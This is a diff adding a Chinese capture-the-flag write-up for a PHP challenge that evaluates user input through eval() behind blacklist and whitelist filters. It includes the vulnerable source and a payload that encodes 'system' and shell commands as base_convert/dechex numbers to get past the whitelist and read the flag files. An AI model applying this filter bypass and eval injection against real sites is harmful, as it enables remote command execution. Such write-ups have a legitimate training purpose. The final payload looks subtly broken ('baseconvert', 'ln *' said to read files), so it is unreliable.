@@ -1,0 +1,40 @@
+源码：
+<?php
+error_reporting(0);
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+if(!isset($_GET['c'])){
+    show_source(__FILE__);
+}else{
+    //例子 c=20-1
+    $content = $_GET['c'];
+    if (strlen($content) >= 80) {
+        die("太长了不会算");
+    }
+    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
+    foreach ($blacklist as $blackitem) {
+        if (preg_match('/' . $blackitem . '/m', $content)) {
+            die("请不要输入奇奇怪怪的字符");
+        }
+    }
+    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
+    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
+    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
+    foreach ($used_funcs[0] as $func) {
+        if (!in_array($func, $whitelist)) {
+            die("请不要输入奇奇怪怪的函数");
+        }
+    }
+    //帮你算出答案
+    eval('echo '.$content.';');
+}
+
+参数c的值要满足一下三个条件：
+1.长度不能大于等于80
+2.不能有空格、制表符、回车、换行、单引号、双引号、反引号，中括号
+3.使用的函数要是whitelist中的函数
+ 
+使用base_convert()函数，base_convert(number, frombase, tobase),number是一个数字，frombase是这个数字的进制，tobase是以多少进制转为字符串(frombase和tobase需要大于等于2小于等于36)。
+base_convert(1751504350,10,36)(base_convert(784,10,36)) 等价于system(ls)
+payload:
+($pi=baseconvert)(1751504350,10,36)($pi(1438255411,14,34)(dechex(1852579882))) 等价于system(ln *)读取所有文件
+就可以读到flag了。
